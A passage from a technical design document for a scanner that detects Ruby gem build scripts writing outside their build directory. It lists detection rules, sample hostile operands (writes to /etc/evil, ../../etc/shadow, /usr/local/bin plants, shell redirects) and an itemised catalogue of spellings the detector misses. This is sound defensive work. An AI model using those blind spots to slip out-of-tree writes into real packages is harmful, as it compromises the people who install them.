interpolation tails (`}x`, `)x`) and SHELL metas (`>`, `;`, `>&`, …) stay outside it, adjudicated as invisible
items (9)/(11) below, tripwired both directions by R3b-C14a/C14b —
BLK-4a + BLK-R3bF2-C: `%(/usr/local/bin/x)` and `%w[/usr/local/bin/x]` are box-live rooted argv
(probe 2026-09-09) that the space-only boundary silent-passed, pinned R3b-C10a/C10b; since BLK-R3bF4-B
the same literals argued PAREN-LESS to a bare verb (`system %q{/usr/…}`) reach the test through the
expanded verb span, pinned R3b-C12a/C12b; since BLK-R3bF5-A so do their NON-PAIRING-delimiter twins
(`system %x|/usr/…|`, designator-less `system %|/usr/…|`, argv0-array `system %w|/usr/… x|`) — the quoted
payload exposes the rooted head to `^`/`"/` directly, pinned R3b-C13a…C13e; URLs stay clean because their slashes follow `:`), or an unparseable span ⇒ `residue-out-of-tree-write` HIGH (R3a-F
fail-closed doctrine: exotic operands — paren-less verbs, dangling spans — COST a row, never a silent
pass; pinned R3b-F). A dangling percent operand with no closer anywhere after it (`system %q{/usr/local/bin/x`
at EOF) is exactly such a span — fail-close re-probed row count 1 — while the degenerate space-delimiter
spelling `spawn %<newline>w[a]` (BLK-R3bF5 NIT-4) is a Ruby SYNTAX ERROR, rows 0, benign, named without
widening.
Percent literals are read before they are judged (BLK-4b): `GEM_PERCENT_LITERAL`/`GEM_PERCENT_PAIRS`
extract the literal text of `%q{…}`/`%Q(…)` — any delimiter, `{ } ( ) [ ] < >` and pairs like
`%q!…!` — and re-feed it through the same mark tests, closing `File.open(%q{/etc/evil}, "w")`, which
the quote-then-slash table alone was blind to. The closer scan is single-level where Ruby's paired
`%q{…}` counts nesting, so brace-nested content cuts at the FIRST `}` (BLK-R3bF5 NIT-1): `system(%q{a{b}/usr})`
pays 1 row via the `"`-then-`/` artifact of the truncated rewrite — the PARENED form is the over-block side —
while the paren-less twin `system %q{a{b}/usr}`'s normalized span drops the tail at the same cut and rows 0,
a correct verdict for that relative argv (Ruby's true value `a{b}/usr` puts its `/` after `}`, item (9)'s class);
fresh probes 1/0, accepted asymmetry, no nested-pair counting added. Path-variable indirection (BLK-2 + BLK-8, R3a
ALL-bindings doctrine): every single-`=` assignment line `id = rhs` is captured with the LHS grammar
`[@$]?[A-Za-z_][A-Za-z0-9_]*[?!]?` — locals, `@ivars`, `$globals` and `CONSTANTS` are all binding
keys (`==`/`=~`/`+=` never match the grammar; re-assignments keep ALL variants); every bare-identifier
FRAGMENT of the span (`@o`, `$p`, `BIN`, `name?`-shaped operands included, BLK-8 fix: the verifier's
q-ivar-clean2 payload `@o = "/usr/local/bin/x"; File.write(@o, "y")` silent-passed because sigil/case
names were outside both the LHS and operand grammars — box-verified live binding, probe 2026-09-09,
pinned R3b-C8 ⇒ three HIGH; BLK-R3bF2-D widened the operand ACCEPTANCE grammar further to `@@cvar`
heads and `$`-builtins (`$0`, `$!`, `$:`, `$-x` — all box-live, probe 2026-09-09) while deliberately
NOT adding them to the LHS binding grammar (no per-name lists, scope-dependent bindability), so an
unbound `@@ov`/`$0` write operand falls into the unresolvable fail-close lane, pinned R3b-C11a/C11b;
BLK-R3bF2-E: an operand whose bound RHS starts `<<` is a HEREDOC — its multi-line value (e.g.
`BINH = <<~EOS` holding `/usr/local/bin/heredoc-target`, box-verified) is invisible to the single-line
grammar, so the operand is never certifiable and fails closed HIGH unconditionally, pinned R3b-C3f)
resolves through that map transitively with a cycle guard — sigil ids are
matched with escaped lookaround anchors because `\b` is undefined at a `@`/`$` edge; a resolution
containing any confinement mark ⇒ HIGH; an UNRESOLVABLE bareword (never assigned, or a binding cycle)
while a rooted literal sits anywhere in the same file ⇒ HIGH, fail-closed (second-argument operands
included — probe caught-second-arg-unres 1 HIGH); an operand resolving only to relative/in-tree
strings ⇒ confined (pinned R3b-C3…C3e). `Dir.chdir`/`Dir::chdir` ANYWHERE in a reachable extconf is
itself a confinement break — it moves the CWD every later relative write inherits — so it contributes
exactly one HIGH row per file regardless of argument (BLK-4c + BLK-5, pinned R3b-C6/C7a); the
false-positive cost of a legitimate in-tree chdir is the accepted exotic-operand price. Relative
operands are otherwise legitimate by CWD construction (the installer runs extconf with the unpacked
extension dir as working directory; the confined golden R3b-PIN2 writes `File.write("acme_ghost.h", …)`
and rows zero).

**Residual limitations (honest, named §1.6-9 lanes; every INVISIBLE item below re-probed
item-by-item against the post-BLK-R3bF2 build through the real staging path — probe run
2026-09-09, box ruby 3.3.8, each row count cited inline; the BLK-R3bF5-A round re-probed every
percent-adjacent count in this section plus all item (9) numbers against the post-fix build with
ZERO drift (fresh staging-path probe run 2026-09-09: C12a 1, C12b 2, C12c 0, microsystem 0,
Kernel::system-percent 1, both %w cost twins 1/1, item (9) 0/0/0/1, parened-%x| 1) and added
item (10); the ROUND-8 roster sweep re-probed EVERY invisible and fail-closed row count cited in
this section against the post-sweep build through the detector seam (probe run 2026-09-09, 28-case
doc-truth re-cite plus the full 71-case before/after table): ZERO drift on every quoted number —
the only counts that MOVED are the newly-covered roster members themselves, 0→1 each, pinned
R3b-C15a…C15f; exotic spellings that the BLK rounds
made CAUGHT moved off this list into the fail-closed lanes below).**
INVISIBLE (no row — escape side): (1) lexical escape from the build CWD
(`File.write("../../etc/shadow")` carries no mark and reads in-tree — origin-verified, never
path-normalized, same family as the crates lexical-traversal class) — probe row count 0;
(2) write indirections outside the closed verb table — StringIO-then-rename
chains, `Marshal.dump` to handles, `Gem.open_file`-style wrappers, AND the
bare Kernel-verb forms with no receiver dot (`open "/usr/local/bin/f", "w"` resolving file mode —
the rename lane), `rename "build/x", "/usr/local/bin/x"`, paren-less `File.new "/usr/local/bin/f", "w"`
AND the PARENED `File.new("/usr/local/bin/f", "w")` — `new` is simply not in the File verb list
(BLK-R3bF2 NIT-2: the doc previously named only the paren-less spelling; both probe row count 0,
2026-09-09 fresh runs — chasing `File.new` means adjudicating File::open's read-mode FPs, out of this
round's scope) — every named shape probe row count 0; they stay invisible BY DECISION: putting the bare verbs
`open`/`rename` into the verb arm would pay for them with an FP explosion on the ordinary word
`open` in prose, identifiers, and IO-adjacent code across every real extconf, so this leg names
them as a priced invisible lane instead of widening the table. ROUND-8 NOTE: the `IO.write("/usr/local/bin/x", "y")`
spelling formerly named first in this item is NO LONGER invisible — the family sweep moved `IO.write`,
`IO.binwrite`, `IO.copy_stream`, `IO.sysopen` and the `File.sysopen`/metadata/deletion `File.*` forms INTO
the table (receiver-fixed arms, no FP surface; pinned R3b-C15c/C15d, see the roster below); ROUND-10 EXPLICIT
NAMINGS (roster-gaps BLK-R3bF9 naming list): ALL `Kernel#open` operand forms share this lane — including the
PIPE-EXEC form `open("|cmd", "w")`, which EXECUTES `cmd` rather than writing a path (the `|` prefix is mode
syntax, the second operand never names a file); its rooted-argv0 containment stays priced where the exec verbs
are, by the `system`/`spawn`/`exec`/`popen` arms — detection unchanged, the class is now named. Second naming:
`STDOUT.write("…")`/`STDERR.write("…")`/`$stdout.write("…")` with a STRING operand are CONTENT-WRITES to an
already-open fd — no path operand exists, no file is created (box-probe 2026-09-09, round-10 log), so only the
`reopen` verb is tabled for the fixed receivers; the payload itself exits the leg with the fd, not the tree. ROUND-12 N3 naming: the IO-INSTANCE writers `syswrite`/`pwrite`/`write_nonblock`/`close_write` are the same content-write/handle class named explicitly — no path operand, the composition of items (2)+(12): the opener that produced the handle is priced by its own arm and the writer itself matches no verb (fresh seam probe 2026-09-09: `f = File.open("build/a", "w")` then `f.syswrite`/`f.pwrite`/`f.write_nonblock`/`f.close_write` ⇒ row count 0); (3) dynamic hook dispatch
(`Gem.send("post_" + "install")`, `const_get`) — obfuscation family, never silently widened (the
`.`/`::` static spellings are NOT in this lane — they register live and row); (4) nested zip/tar
archives shipped in a gem and unpacked by code at RUNTIME — the leg never recursively unpacks;
(5) user-home resolution through helpers other than the four marks (config-path sugar chains like
`config_home`) — probe row count 0; (6) binding values that come from METHOD RETURNS
(`dst = pick_target` resolves to opaque text, judged confined) — probe row count 0; (7) values
mutated by `+=` churn (`o = "build"` then `o += "/usr/local/bin/x"` — only the pre-churn `=` line
is tracked and the rooted part never appears as the operand's own text) — probe row count 0;
(8) identifiers NESTED inside call-expression operands (`File.write(File.join(dir, "x"), "y")` —
the bareword lane parses whole-fragment operands only; a bare identifier argued to a nested call
is not chased into a binding) — probe row count 0; nor are COMPOSED operand shapes decomposed
(BLK-R3bF2 NIT-1 enumeration): index operands `File.write(arr[0], "y")` with `arr = ["/usr/local/bin/x"]`
bound, and splat execs `system(*arr)` with the same binding — the fragment carries `[0]`/`*` so it
matches no bare-identifier grammar and no span mark sees inside it — 2026-09-09 fresh probe row
count 0 each; (9) string-interpolation-then-slash and closing-delimiter adjacency (BLK-R3bF4-A):
`"#{p}/usr/local/bin/x"` with an EMPTY or relative `p` (`p = ""`; box ruby 3.3.8 wrote the interpolated
rooted path live, probe 2026-09-09) and the backtick/system shape `` `run()/usr/bin/thing` `` (slash after
a CLOSING `)`) carry their `/` outside the exact `[\s(\[{<]` boundary class — the matcher reads text and
never evaluates interpolation, the same ORIGIN-ONLY/never-normalize family as the crates lexical-traversal
and `format!`-interpolation disclosures (§8 R3a, "interpolation that never makes the env call"); widening
the class to `}`/`)`-adjacency is NOT cheap: `"#{dir}/file"` is THE idiomatic in-tree path join, so the
adjacency would row every real extconf — the same priced-FP reasoning that kept `File.new` out of the verb
table (item (2)); fresh probes on the post-BLK-R3bF4 build: interpolation-then-slash row count 0,
backtick `)`-adjacent row count 0, relative-prefix interpolation `"#{d}/gen.c"` (`d = "build"`) row count 0.
ENV/home MARKS inside the interpolation DO still row — the mark lane is independent of the boundary class
(`File.write("#{ENV['HOME']}/x", "d")` fresh probe row count 1); (10) the DOT-receiver Kernel verbs argued a
percent operand (BLK-R3bF5 NIT-2): `Kernel.system %q{/usr/x}` — one sentence why: the bare-verb lookbehind
`(?<![\w.])` refuses `.`-adjacency by design (arbitrary `obj.system`-shaped calls must not row), so a box-live
`Kernel.system` (measures `true` with explicit module receiver on ruby 3.3.8, probe 2026-09-09) carrying a
`%q{…}`/`%w|…|`-style operand matches no verb at all, while the `::` spelling rows because `:` sits outside
that class (§8 design above, pinned R3b-C7e for the `::`-form; fresh probe row count 0); (11) SHELL-METACHAR
adjacency to a rooted path inside one operand (ROUND-8 complement-class pin, BLK-R3bF6-W2 lineage): `system "echo x>/tmp/r3b8_cmpgt"`,
`"echo x;/tmp/…"`, `"echo x>&/tmp/…"` and the full complement set (adjacency char NOT in the EXACT `[\s(\[{<]`
opening class: `% + $ ` > ; | & , * } ] )` probed one by one, all row count 0) — the SHELL would execute the
redirect/chaining against the rooted target (box-liveness re-measured on ruby 3.3.8: `>` materializes the file,
`;` and `&` execute the following segment) but the matcher reads origin text only, so the `/` sits at a
non-boundary offset and the ROOTED test cannot see it — same ORIGIN-ONLY family as item (9), and widening the
class to shell metachars would row ordinary text like `"echo x,/tmp/rel"`-adjacent identifiers across real
extconfs; the whole complement is pinned as a tripwire (adding ANY adjacency char to the class flips C14b/C15g
RED, and a control string-start rooted operand pins the 1-row side: R3b-C14a closure/interp tails, R3b-C14b
shell metas + control); (12) ARBITRARY-receiver `reopen` (ROUND-8): `f = File.open("build/a", "w"); f.reopen(STDOUT)`
— instance-level fd hijack through a user-bound handle or ANY object named `stdout`-shaped — rows 0 by the same
arbitrary-receiver doctrine as item (10) (a `\.reopen` bare arm would row every `buf.reopen`-shaped innocent call;
the leg covers only the SEVEN FIXED global-fd receivers — `$stdout`/`$stderr`/`$stdin`/`$>` plus `STDOUT`/`STDERR`/
`STDIN` — which are the ones a fresh extconf process hits without any prior setup; the round-9 claim of SIX was wrong:
the M0 machine table shows `$>` is a one-letter `$stdout` ALIAS, box-LIVE and it silent-passed UNNAMED
(BLK-R3bF9-A, covered R10 pinned C15a-bis, dot + `::` + paren-less forms); `$<` stays matcher-OUTSIDE because ARGF.class
has NO reopen method on box 3.3.8 (DEAD today — named in the roster; if a future Ruby adds it the `$>`-alias lane
is where it belongs), and `IO.for_fd(n).reopen(x)`-shaped fd-expression handles need the prior `IO.for_fd` binding,
so the same no-prior-setup criterion that excludes arbitrary handles puts them in THIS lane, not an oversight);
a handle opened on a rooted path still rows through the opener arm itself (probe:
`File.open("/usr/local/bin/x", "w")` 1).
FAIL-CLOSED (row — false-alarm side):
legitimate `ENV["EXTOUT"]` staging trips the ENV mark and pays a badge (2026-09-09 fresh probe row
count 1); `make -C /usr/src`-style rooted bare hints pay a T3 row (BLK-4a cost), and since BLK-R3bF2-C
so do their bracket-adjacent twin spellings — the whitelisted-verb argv hint `system(%w[install -m755
build/x /usr/bin/make])` in a real extconf NOW ROWS (fresh probe row count 1, pinned R3b-C10c) — and
since BLK-R3bF4-B so does its paren-less twin `system %w[install -m755 build/x /usr/bin/make]` (fresh
probe row count 1, the same accepted cost):
naming the `%w` argv class silent instead would gut the exec-confinement lane (the verifier's own
adjudication note), so the FP cost of the widened boundary is ACCEPTED, not papered; any `Dir.chdir` — even into
an in-tree subdir — costs one T3 row (BLK-4c cost); prose containing
`Gem.post_install`/`Gem::post_install` costs a T4 row (P5-class over-detection, blessed like the
crates prose lane); ANY unresolvable bareword operand rows, `@`/`$`-sigilled names included —
since BLK-R3bF2-D the `@@cvar` and `$`-builtin heads (`@@ov`, `$0`) join that lane (fresh probe row
count 1 each, pinned R3b-C11a/C11b) — and since BLK-R3bF2-E a heredoc-bound operand rows
UNCONDITIONALLY, without needing a rooted literal elsewhere in the file (fresh probe row count 1,
pinned R3b-C3f); since BLK-5 a rooted literal in ANY argument position of a
whitelisted verb pays a row — the destination-side form `FileUtils.cp("build/a", "/usr/local/bin/b")`
was silent under first-argument-only scanning and now probes row count 1; multi-target assignment
LHS (`o, p = "rel", "/usr/local/bin/g"`) is outside the single-name grammar, so the later
`File.write(p, …)` lands in the unresolvable-bareword lane (2026-09-09 fresh probe row count 1 —
fail-closed, not invisible). The quoted-word spelling `fmt = "%x"` costs NOTHING only mid-file, where
the generic `%x` delimiter scans forward to a LATER quote char and the absorbed closer-to-closer span
happens to carry no mark (2026-09-09 fresh probe: row count 0); the same spelling at EOF pays 1 row —
the closer scan hits end-of-file, the verb span is unparseable, and the fail-closed arm fires (fresh
probe row count 1); and a phantom variant with rooted path text between the two quotes pays 1 row via
the absorbed span (fresh probe: a comment line `# hint: install target /usr/local/bin` between the
quotes → row count 1). This over-block side is ACCEPTED: the closer scan stays anchor-generic on
purpose — special-casing `%x` inside quotes would re-open the BLK-6 delimiter-enumeration class
(doc-truth-first, no code anchor-change this round). The same anchor-generic scan double-prices a rooted
payload inside ONE backtick exec with an embedded `%q` — `` `make %q{/usr/local/bin/x}` `` pays 2 rows (the
opening-backtick span plus the trailing-backtick unparseable fail-close span; BLK-R3bF5 NIT-3, fresh probe
row count 2, accepted over-block double-count, pre-existing shape); the ROUND-10 machine walk found the
same double-price for `IO.popen %x|/usr/local/bin/x|` (verb-arm row plus `%x`-arm row, 2 total) — accepted on
THIS precedent, fail-closed side, no de-dup arm added. `GEM_CONFINED_MARKS` (NIT-1) was an exported table no
predicate consumed and has been DELETED: $extout/DISTDIR staging is confinement-legitimate through
the ABSENCE-of-marks rule itself (those tokens carry no mark, so they never row), so no wiring was
possible without weakening the marks-beat-everything posture. Unparseable `metadata.gz` extensions
(including the BLK-7 duplicate-`extensions:` THROW) or an unreadable gzip stops the gate (exit 2)
rather than certify clean; non-gem-layout containers keep the pre-R3b engine-only behavior. The
stage still executes `gem build` on the trusted working tree — gemspec-DSL execution risk is
pre-R3b and unchanged (same posture as pypi's setup.py, §8 R3a); NOTHING unpacked from an untrusted
.gem is ever executed, every gem fixture is pattern-matched as text.

**Family-completeness declaration (ROUND-8).** Round 8's lesson (learnings.md): per-finding doc naming is
incomplete convergence — the WHOLE Ruby write-primitive call-form roster of the MACHINE-TABLE UNIVERSE was swept exhaustively ONCE (ROUND-12 scoping: machine-table universe = the five walked constants (File/Dir/IO/Kernel/FileUtils) + the mkmf splice; opt-in require-gated classes are NAMED — see the ROUND-12 OPT-IN STDLIB WRITE OBJECTS row below — not walked), each
member box-probed for runtime liveness (ruby 3.3.8, sentinel paths under the round's scratch only) and
detector-probed through the `residueGemHits` seam (rows measured before and after the widen; full 71-case
before/after table in the R8 DoneClaim). Live + previously silent ⇒ covered; deletion/metadata ⇒ covered only
with an adjudication (below); read-only or dead ⇒ named. `rm_r`-wildcard precedent: the table ALREADY rowed
`FileUtils.rm_r`/`remove` (destructive) and every `FileUtils.*` name via the wildcard arm — so excluding
`File.unlink`/`File.delete`/`Dir.rmdir` while its FileUtils twins rowed was an inconsistency, not an
adjudication; R8 rows the deletion lane uniformly (`unlink`/`delete`/`rmdir` are also write-enablers: free
space/inode for a later plant, and `rmdir`+`mkdir` reroots tree entries). MetADATA verbs (`truncate`, `utime`,
`chown`/`lchown`, `chmod` twins `lchmod`, `mkfifo` creates, `sysopen` returns a WRITING fd, `IO.copy_stream`
bulk-copies) all create-or-modify state AT a rooted path ⇒ covered. READ-ONLY primitives are excluded by
definition, never by omission, and pinned silent (R3b-C15h): `IO.read/binread/readlines`, `Dir.entries`,
`File.basename/dirname/fnmatch/exist?/absolute_path/stat/read`.

**Machine-derivation declaration (ROUND-10).** Rounds 1-9 kept converging on *recalled* verb lists; round 9
reproduced every number yet still leaked three ALIAS derivatives (`$>`, `Dir.delete`/`unlink`, `File.lutime`).
Round 10 therefore DERIVED the machine-table universe from the interpreter — ROUND-12 literal scope of every closure claim in this section and in the mapping artifact: machine-table universe = the five walked constants (File/Dir/IO/Kernel/FileUtils) + the mkmf splice; opt-in require-gated classes (Pathname, Tempfile, the include-FileUtils bare surface) are NAMED (the ROUND-12 OPT-IN row below), not walked. Source: `.omo/evidence/residue-spike/ruby-alias-table-3.3.8.txt`
enumerates ALL public/singleton methods of `File`, `Dir`, `IO`, `Kernel` (incl. privates: `open`/`system`/`spawn`/
`exec`/`load`/`require`/`syscall`/…) and `FileUtils` on box ruby 3.3.8, plus the reopen-family `respond_to?` matrix
and the `$>`/`$<` equality probes; the mkmf top-level verbs come from `/usr/lib/ruby/3.3.0/mkmf.rb` SOURCE
(`rm_f`:252, `rm_rf`:258 module_functions; the include-splice at mkmf.rb:2890-2894 promotes all 104 `MakeMakefile`
instance methods to extconf top-level privates — on this box `require "mkmf"` aborts on missing ruby-dev headers
BEFORE the splice, so liveness is source-proved plus mechanism-simulated, both logged). Every family member then got
a M1 box verdict (`m1-box-probes-round10.txt`) and a seam row count (`m1-seam-probe-BEFORE.txt` → 14 LIVE-UNCOVERED:
the 3 blockers' spellings × forms + `File.copy_stream`/`File.popen`/`Dir::delete`/`Dir.chroot`/bare `rm_rf`/`rm_f`/
`xsystem`/`xpopen`; `m1-seam-probe-AFTER.txt` → 0, controls hold at exactly 1 each incl. the no-double-price
`FileUtils.rm_rf` re-check, in-tree guards hold at 0). A reviewer can re-run the derivation and diff this roster.

Named DEAD (probed `NoMethodError` on box
3.3.8; the `FileUtils.*` wildcard still rows their spellings as accepted over-block, fail-closed direction):
`FileUtils.truncate`, `FileUtils.split` (the roster's "split_chunk" is no filesystem API); ROUND-10 machine-walk
additions: `File.futime`/`IO#futime`/`IO#fchmod`/`IO#fchown` DO NOT EXIST on 3.3.8 — the handle-time setters the
verifier's FIX7 suggested naming as a row are simply not spellings here (the lutime row below is the whole
metadata-time family on this box); `$<.reopen`/`ARGF.reopen` (ARGF.class has no reopen — item (12) clause);
bare top-level `rename` and bare `popen` (Kernel offers neither — the live spellings are `File.rename`, covered,
and `IO.popen`, covered; the bare-arm entries for them are harmless defensive spellings); `Fu` (no such
FileUtils short alias in fileutils 1.7.2). Roster (live? per box ruby 3.3.8 probe; rows = rooted-operand
`"/tmp/r3b8_<name>"` detector seam, before → after):

| primitive | live? | rows before → after | disposition |
|---|---|---|---|
| `File.open/touch/link/symlink/rename/chmod` (File arm) + `File.write/binwrite/sysopen` (R10: moved into the shared `(?:File\|IO)` arm, rowing unchanged) | yes | 1 → 1 | covered (pre-existing) |
| `File.sysopen`, `File::sysopen` | yes (fd 5) | 0 → 1 | **covered R8** (C15c) |
| `IO.sysopen` | yes | 0 → 1 | **covered R8** (C15c) |
| `IO.write`, `IO.binwrite`, `IO.copy_stream` | yes | 0 → 1 | **covered R8** (C15d; item (2) retraction) |
| `File.copy_stream`, `File.popen` | yes — IO singletons INHERITED by File (File's own singleton list lacks them; `respond_to?` true, box-proved copy_stream wrote the rooted dest, popen executed argv0) | 0 → 1 | **covered R10** (C15i — BLK-R3bF9 sweep delta) |
| `File.mkfifo` (fifo node), `File.truncate`, `File.utime`, `File.chown`, `File.lchmod` (mode actually changed), `File.lchown` | yes | 0 → 1 | **covered R8** (C15e) |
| `File.lutime` (lutimes(2), does NOT follow symlinks — strictly more deceptive than utime) | yes (returns 1, mtime changed) | 0 → 1 | **covered R10** (C15e 8→9 — BLK-R3bF9-C); sibling `File.futime` absent on 3.3.8 — DEAD row above |
| `File.symlink`/`File.link` rooted-DESTINATION operand | yes | 1 → 1 | covered (2nd-arg sweep C15e) |
| `File.unlink`, `File.delete`, `Dir.rmdir` | yes (deletion) | 0 → 1 | **covered R8** (C15f; rm_r-wildcard precedent) |
| `Dir.delete`, `Dir.unlink` ($Deletion twins of rmdir — `Dir.delete("/tmp/r3b10_ddel")` REMOVED a fresh dir on box), `Dir::delete` colon form | yes | 0 → 1 | **covered R10** (C15f 3→5 + C15i — BLK-R3bF9-B) |
| `Dir.chroot("/usr/…")` — the CONFINEMENT BREAK itself; operand-absolute-only pricing, relative `Dir.chroot("build")` stays 0-row (box EPERM non-root proves liveness of the syscall, not root) | yes | 0 → 1 | **covered R10** (C15j — sweep delta) |
| `Dir.mkdir` | yes | 1 → 1 | covered |
| remaining `Dir` singletons (`foreach`/`children`/`each_child`/`entries`/`glob`/`open`/`getwd`/`pwd`/`home`/`exist?`/`empty?`/`[]`) | yes (read-only) | 0 → 0 | excluded by definition (C15h family); `Dir.chdir` rows via its own T3 arm (BLK-4c); `Dir.for_fd`/`fchdir` are fd-handle forms → item (12) doctrine |
| `FileUtils.cp/copy/mv/install/touch/mkdir_p/mkpath/ln/ln_s/ln_sf/remove/rm_r/copy_stream/chmod/chown` | yes | 1 → 1 | covered (wildcard) |
| `FileUtils.truncate`, `FileUtils.split` ("split_chunk") | NO — NoMethodError | 1 → 1 | named-dead; wildcard over-block kept (fail-closed side) |
| `$stdout.reopen`, `$stderr.reopen` (fd-hijack WRITES), `$stdin.reopen`, `STDOUT/STDERR/STDIN.reopen`, `::`-spaced variants | yes | 0 → 1 | **covered R8** (C15a/C15b — BLK-7) |
| `$>.reopen(…)`, `$>::reopen(…)`, paren-less `$>.reopen "…"` — `$>` is $stdout's one-letter alias (box-proved `$>.equal?($stdout)===true`, reopen MATERIALIZE the rooted target, no prior setup) | yes | 0 → 1 (×3 forms) | **covered R10** (C15a-bis — BLK-R3bF9-A; round-9's "closed at six members" claim corrected to SEVEN) |
| `$<.reopen`/`ARGF.reopen` — `$<` is NOT `$stdin` here (`$<.equal?($stdin)===false`; `$<` is ARGF and ARGF.class has NO reopen) | NO — method missing | 0 → 0 | named-DEAD (matcher deliberately does NOT add `$<`); if future Ruby adds it, it joins the `$>`-alias lane |
| `IO.for_fd(n).reopen(…)`, `IO.new(fd).reopen(…)`, `Dir.for_fd`/`Dir.fchdir(fd)` — fd-EXPRESSION handles needing a prior `for_fd`/`new(fd)`/opener binding | yes | 0 → 0 | named invisible (12) by the no-prior-setup criterion (clause added R10); a handle opened ON a rooted path rows via the opener arm itself (`File.open("/usr/…","w")` 1) |
| `IO.new(path)` | NO — TypeError 'no implicit conversion of String into Integer' (fd-int API) | 0 → 0 | correctly excluded (machine-table proof it is not a path-writing spelling) |
| `$stdout.reopen "…" ` paren-less | yes | 0 → 1 | covered via fail-close span arm |
| arbitrary-receiver `f.reopen(io)` | yes | 0 → 0 | named invisible (12) |
| bare `system/spawn/exec/popen` (+`(`,quote,percent), `%x<delim>`, backtick, `Process.spawn`, `Open3.*`, `Kernel::system` | yes | 1 → 1 | covered |
| mkmf top-level bare `rm_rf(…)`, `rm_f "…"` (paren-less), `xsystem("touch /usr/…")`, `xpopen("/usr/…")` — `MakeMakefile` module_functions (mkmf.rb rm_f:252/rm_rf:258, xsystem/xpopen wrap IO.popen) the include-splice at mkmf.rb:2890-2894 promotes to extconf privates; rm_f/rm_rf delegate FileUtils.rm_f/rm_rf over `Dir[*glob]` expansions, xsystem/xpopen EXECUTE; dotted `FileUtils.rm_rf` stays ONE row via the `[\w.]` lookbehind (C15i re-assert) | yes (source-proved + mechanism-simulated — box lacks ruby-dev so `require "mkmf"` SystemExits before the splice) | 0 → 1 (×4) | **covered R10** (C15j — sweep delta; mkmf read-only helpers `create_header`/`create_makefile`/`install_files` stay out, §8 mkmf note above). ROUND-12 N4 user-shadow naming: the bare verbs row even when the extconf SHADOWS them — `def rm_f; end; rm_f "/usr/local/bin/y"` rows 1 (fresh seam probe 2026-09-09; the `def rm_f; end` line itself pays nothing: `;` is not an operand-class char) — the matcher reads call-site text, never method resolution, so a benign user definition cannot silence the arm (fail-CLOSED direction); the priced surface stays call-shaped, the same identifier-refusal that keeps `microsystem %q{/usr/local/bin/x}` at 0 bounds this shadow class's FP cost |
| `STDOUT.write("s")`/`STDERR.write("s")`/`$stdout.write("s")` STRING operand | yes | 0 → 0 | named CONTENT-WRITE (item (2) R10 naming — payload exits via the fd, no path operand; only `.reopen` is the tabled verb for the fixed receivers) |
| `open("|cmd", "w")` pipe-EXEC | yes | 0 → 0 | named (item (2) R10 reword) — EXECUTES cmd, the `|`-prefixed second token is not a file; rooted argv0 containment remains the exec arms' job |
| OPT-IN STDLIB WRITE OBJECTS (ROUND-12, BLK-R3bF10-A): `Pathname#write/binwrite/chmod/chown/delete/unlink/mkdir/rmdir/rename/symlink` (`require "pathname"`), `Tempfile.new([stem, dir])` (`require "tempfile"`; the DIR element = creation at an arbitrary path), and the bare-verb surface after `require "fileutils"` + `include FileUtils` (`mkdir_p`/`cp`/`mv`/`rm`/…): none is in the closed table | yes AFTER require (box ruby 3.3.8 fresh probe 2026-09-09: `defined?(Pathname)`/`defined?(Tempfile)`/`defined?(FileUtils)` ⇒ nil nil nil without, all `"constant"` after; `Pathname#write` owner = Pathname) | 0 → 0 | require-gated ⇒ accepted invisible lane per the opt-in doctrine — machine-table-unwalked by the scope declaration above (five walked constants + mkmf splice). Fresh seam probes on the shipped build 2026-09-09: `Pathname.new("/usr/local/bin/plant").write("y")` 0; Pathname delete/chmod/mkdir/rename/symlink rooted chain 0; `Tempfile.new(["evil", "/usr/local/bin"])` 0; bare `mkdir_p "/usr/local/bin/aa"` and `cp "build/a", "/usr/local/bin/b"` after include 0. The dotted DUALS stay priced — `FileUtils.chmod_R(0o777, "/usr/local/bin/z")` and `FileUtils.chown_R(0, 0, "/usr/local/bin/z")` each row 1 via the wildcard arm (fresh probes), so only the receiver-less opt-in surface is invisible; ONE honest overlap named: the defensive mkmf bare verbs `rm_rf`/`rm_f`/`xsystem`/`xpopen` (row above) also name FileUtils module functions, so bare `rm_rf "/usr/…"` on the include-FileUtils surface rows 1 (fresh probe) — fail-closed side |
| `Kernel.system` dot-receiver + percent operand | yes | 0 → 0 | named invisible (10) |
| `File.new` paren-less/parened, bare `open`/`rename` | yes | 0 → 0 | named invisible (2), FP-priced |
| `Marshal.dump`→handle, `Gem.open_file`, StringIO chains | yes | 0 → 0 | named invisible (2) |
| `IO.read/binread/readlines`, `Dir.entries`, `File.basename/dirname/fnmatch/exist?/absolute_path/stat/read` | yes (read-only) | 0 → 0 | excluded by definition, pinned silent (C15h) |
| `../../` lexical traversal; `"#{p}/usr/…"` + shell-meta adjacency (complement class `% + $ ` > ; | & , * } ] )`) | yes (runtime) | 0 → 0 | named invisible (1)/(9)/(11), tripwired C14a/C14b |
| composed/index/splat operands, method-return & `+=`-churn bindings, helper home sugar | mixed | 0 → 0 | named invisible (5)-(8) |

**Pins.** R3b-PIN (golden pure-ruby: console script, executables, no extensions key, no plugin) and
R3b-PIN2 (confined mkmf extconf) emit ZERO residue rows before and after the leg; the BLK-1..4 round
adds R3b-B3 (`::`-form hook), R3b-C3…C3e (binding resolution incl. transitive, cycle fail-close,
relative confined), R3b-C4/C5/C6 (`%x|…|`, `%q{/etc/evil}`, `Dir.chdir`), R3b-G3…G6 (comment-in-block
still collected, blanks/EOF ⇒ legitimate zero, unrecognized line ⇒ THROW); the BLK-5..8 round adds
R3b-B4 (`File :: write` spaced-`::`), R3b-C7a…C7e (`Dir::chdir`+relative write exactly-one-HIGH,
`FileUtils::cp` rooted-DESTINATION, `Dir::mkdir` rooted, `Open3::pipeline_rw` rooted, `IO::popen` +
`Kernel::system` rowing by table design), R3b-C4b/C4c (generic `%x!…!`/`%x"…"`/`%x~…~` delimiters),
R3b-G7/G8 (duplicate `extensions:` keys — unit both orders + stage ⇒ THROW, never silent) and
R3b-C8 (`@ivar`/`$global`/`CONSTANT` binding matrix ⇒ three HIGH); the BLK-R3bF2 round adds
R3b-C9a/C9b/C9c (`Dir::home`, `ENV::[]`, and `ENV::fetch` rowing via the T3 mark lane itself),
R3b-C9d/C9e (`Process.spawn` P20-verbatim ⇒ 1 HIGH; dotted + colon forms ⇒ exactly one row each, no
double count), R3b-C10a/C10b/C10c (`%(/usr/…)` and `%w[/usr/…]` bracket-adjacent rooted argv + the
accepted `%w[install … /usr/bin/make]` FP-cost pin), R3b-C11a/C11b (`@@cvar`/`$0` fail-closed
bareword lane) and R3b-C3f (heredoc-RHS fail-close); the BLK-R3bF4 round adds R3b-C12a/C12b
(paren-less percent operands on the bare verbs — `system %q{…}`/`exec %q{…}`/`system %{…}` row through
